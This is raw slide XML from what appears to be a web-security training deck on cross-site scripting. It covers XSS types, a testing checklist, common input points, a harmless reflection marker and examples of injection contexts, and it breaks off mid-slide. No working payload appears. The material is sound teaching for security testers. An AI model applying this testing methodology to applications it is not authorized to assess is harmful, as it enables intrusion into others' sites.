                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>Vulnerability Location</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Server</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Server</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>Browser JavaScript</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1889123430"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="889961">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
                        <a:t>Payload May Never Reach Server</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>No</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>No</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Yes</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2956659449"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61EB65B7-3AF1-7993-60DE-F5A8BE79DA4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Stored, Reflected and DOM based XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A71E6194-693C-06DE-AA0E-2DCF132F272E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>21</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13396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41395B-C340-FB8D-1941-518A8DCBEA71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> testing involves identifying </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>locations where user-controlled input is processed by a web application and determining whether malicious JavaScript can be executed in a user's browser.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Testing should only be performed on applications you own or are explicitly authorized to assess.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE442152-AE42-703E-7ABB-362F9E1D68FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>How to find and test for XSS vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AADA28B4-B278-70C6-6259-3B68BBF0EEAA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>22</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1564008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F6C733-43F9-8397-A82F-C8D16EAD442E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="1243013"/>
            <a:ext cx="5257799" cy="4933950"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Understand the Application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Identify Reflection Points</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Determine the Context</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Test for Stored XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Test for Reflected XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Test for DOM-Based XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Perform Source and Sink Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DA1170F-41D8-3093-1049-01044D7035A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>How to Find and Test for XSS Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4607E328-901C-6C16-3823-AEDDD37BA587}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A3600B1-D22D-F633-5CB6-CA3D6D9DA736}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6642100" y="1254132"/>
            <a:ext cx="4876799" cy="49339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52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Examine Browser Developer Tools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Check Input Filters and Encoding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inspect JavaScript Files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Test Different Input Locations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Analyze Client-Side Framework Usage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Look for User-Controlled HTML Rendering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2859872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E358E587-2204-F4C1-C7F1-C38A6EFDADF5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2989313115"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="558800" y="957264"/>
          <a:ext cx="11036300" cy="5367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A4B6A81F-F1DD-A5EC-E005-64C37EBB4441}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>XSS Testing Methodology</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3703BF95-738E-AD32-C534-DB55B91741F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>24</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="858498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9D17D0-9482-B25A-AFCD-F9A5408BE95C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Before testing, map out all locations where user input is accepted.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common input points include:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Search boxes </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Login forms </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Registration forms </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Comment sections </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Contact forms </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User profiles </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL parameters </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP headers </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>File names </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Chat messages </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Review sections </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>API parameters </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=test</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>profile?name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=test</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The goal is to identify every place where your input might later appear in a page.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7631C86-77C7-B613-E5C4-32CBE34C413C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Understand the Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A48A771-31EC-AFAD-6CEA-3C35A6A57AE7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>25</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3548767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17F072-78CE-F6BE-1903-061F9FBD9FAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Start by checking whether input is reflected back into the application's response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For example, enter a unique string:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS_TEST_12345</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If the response displays:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You searched for: XSS_TEST_12345</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>then the application reflects your input and may be worth investigating further.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7D9057F-A131-4A76-B01B-702EA677DE48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Identify Reflection Points</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90738E51-DDD7-9F2A-1804-BDA274A73632}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>26</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="384881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CF7F2E-A455-7C7A-0647-7C2C1BB66393}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Finding where your input appears is critical because the required payload depends on the context.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common contexts:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTML Context</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;div&gt;XSS_TEST_12345&lt;/div&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Attribute Context</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;input value="XSS_TEST_12345"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>JavaScript Context</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>var user="XSS_TEST_12345";</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>URL Context</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>="/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>page?name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=XSS_TEST_12345"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
